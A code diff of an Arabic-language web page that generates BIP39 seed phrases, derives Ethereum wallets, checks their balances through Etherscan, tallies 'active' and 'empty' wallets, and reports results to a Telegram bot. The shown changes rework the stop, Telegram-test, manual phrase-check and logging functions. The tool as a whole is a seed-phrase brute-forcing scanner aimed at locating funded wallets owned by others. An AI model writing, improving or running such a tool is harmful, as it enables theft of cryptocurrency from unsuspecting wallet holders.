                 searchInterval = null;
             }
-            
+
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+
+            log('تم إيقاف البحث', 'info');
             updateStatus('تم إيقاف البحث', 'warning');
-            addLogEntry('⏹️ تم إيقاف البحث');
-            
-            // إرسال رسالة الإيقاف إلى Telegram
-            let stopMessage = `⏹️ <b>تم إيقاف عملية البحث</b>\n\n`;
-            stopMessage += `📊 <b>الإحصائيات النهائية:</b>\n`;
-            stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
-            stopMessage += `✅ المحافظ النشطة: ${stats.activeWallets}\n`;
-            stopMessage += `❌ المحافظ الفارغة: ${stats.emptyWallets}\n`;
-            stopMessage += `\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
-            
-            await sendTelegramMessage(stopMessage);
         }
 
-        async function testTelegramConnection() {
-            updateStatus('جاري اختبار الاتصال بـ Telegram...', 'info');
-            addLogEntry('🧪 جاري اختبار الاتصال بـ Telegram...');
-            
-            const testMessage = `🧪 <b>اختبار الاتصال</b>\n\nتم الاتصال بنجاح مع بوت Telegram!\n⏰ ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
-            const success = await sendTelegramMessage(testMessage);
-            
-            if (success) {
-                updateStatus('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
-                addLogEntry('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
-            } else {
-                updateStatus('❌ فشل في الاتصال بـ Telegram', 'danger');
-                addLogEntry('❌ فشل في الاتصال بـ Telegram', 'error');
+        // اختبار Telegram
+        async function testTelegram() {
+            try {
+                testTelegramBtn.disabled = true;
+                testTelegramBtn.innerHTML = '<span class="loading-spinner"></span> جاري الاختبار...';
+
+                const testMessage = '🧪 رسالة اختبار من مولد عبارات BIP39\n\n' +
+                                  `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
+                                  '✅ البوت يعمل بشكل صحيح!';
+
+                await sendToTelegram(testMessage);
+                log('تم إرسال رسالة الاختبار بنجاح', 'success');
+                alert('تم إرسال رسالة الاختبار بنجاح!');
+            } catch (error) {
+                log(`فشل اختبار Telegram: ${error.message}`, 'error');
+                alert(`فشل اختبار Telegram: ${error.message}`);
+            } finally {
+                testTelegramBtn.disabled = false;
+                testTelegramBtn.innerHTML = '<span>📱 اختبار Telegram</span>';
             }
         }
 
+        // اختبار عبارة يدوياً
+        async function testManualMnemonic() {
+            const mnemonic = document.getElementById('manualMnemonic').value.trim();
+            const resultDiv = document.getElementById('manualTestResult');
+
+            if (!mnemonic) {
+                alert('يرجى إدخال عبارة BIP39');
+                return;
+            }
+
+            if (!isValidMnemonic(mnemonic)) {
+                alert('عبارة BIP39 غير صحيحة');
+                return;
+            }
+
+            try {
+                testManualBtn.disabled = true;
+                testManualBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
+
+                const wallet = createWalletFromMnemonic(mnemonic);
+                const balanceInfo = await checkWalletBalance(wallet.address);
+
+                resultDiv.style.display = 'block';
+                resultDiv.className = `test-result ${balanceInfo.isActive ? 'active' : 'inactive'}`;
+                
+                resultDiv.innerHTML = `
+                    <h4>نتيجة الفحص</h4>
+                    <p><strong>العنوان:</strong> ${wallet.address}</p>
+                    <p class="balance ${balanceInfo.balance > 0 ? 'positive' : 'zero'}">
+                        <strong>الرصيد:</strong> ${balanceInfo.balance} ETH
+                    </p>
+                    <p class="transactions">
+                        <strong>عدد المعاملات:</strong> ${balanceInfo.transactionCount}
+                    </p>
+                    <span class="status ${balanceInfo.isActive ? 'active' : 'inactive'}">
+                        ${balanceInfo.isActive ? 'محفظة نشطة' : 'محفظة فارغة'}
+                    </span>
+                `;
+
+                log(`فحص يدوي: ${wallet.address} - ${balanceInfo.isActive ? 'نشطة' : 'فارغة'}`, 
+                    balanceInfo.isActive ? 'success' : 'info');
+
+            } catch (error) {
+                log(`خطأ في الفحص اليدوي: ${error.message}`, 'error');
+                alert(`خطأ في الفحص: ${error.message}`);
+            } finally {
+                testManualBtn.disabled = false;
+                testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
+            }
+        }
+
+        // مسح السجل
         function clearLogs() {
-            elements.logPanel.innerHTML = '';
-            addLogEntry('تم مسح السجل');
+            logPanel.innerHTML = `
+                <div class="log-entry log-info">
+                    <span class="log-timestamp">[${new Date().toLocaleTimeString('ar-EG')}]</span>
+                    تم مسح السجل
+                </div>
+            `;
         }
 
         // ربط الأحداث
-        elements.startBtn.addEventListener('click', startSearch);
-        elements.stopBtn.addEventListener('click', stopSearch);
-        elements.testTelegramBtn.addEventListener('click', testTelegramConnection);
-        elements.clearLogsBtn.addEventListener('click', clearLogs);
-        elements.testManualBtn.addEventListener('click', testManualMnemonic);
+        startBtn.addEventListener('click', startSearch);
+        stopBtn.addEventListener('click', stopSearch);
+        testTelegramBtn.addEventListener('click', testTelegram);
+        testManualBtn.addEventListener('click', testManualMnemonic);
+        clearLogsBtn.addEventListener('click', clearLogs);
 
-        // التحقق من تحميل ethers.js عند بدء التطبيق
-        document.addEventListener('DOMContentLoaded', function() {
-            if (checkEthersLoaded()) {
-                updateStatus('✅ تم تحميل مكتبة ethers.js بنجاح. جاهز للبدء...', 'success');
-                addLogEntry('✅ تم تحميل مكتبة ethers.js بنجاح', 'success');
-            }
-        });
-
-        // تحديث الإحصائيات عند بدء التطبيق
+        // تحديث الإحصائيات عند التحميل
         updateStats();
+
+        // رسالة الترحيب
+        log('مرحباً بك في مولد عبارات BIP39 المحسن مع Etherscan API', 'info');
+        log('يرجى إدخال مفتاح Etherscan API وإعدادات Telegram قبل البدء', 'info');
     </script>
 </body>
 </html>
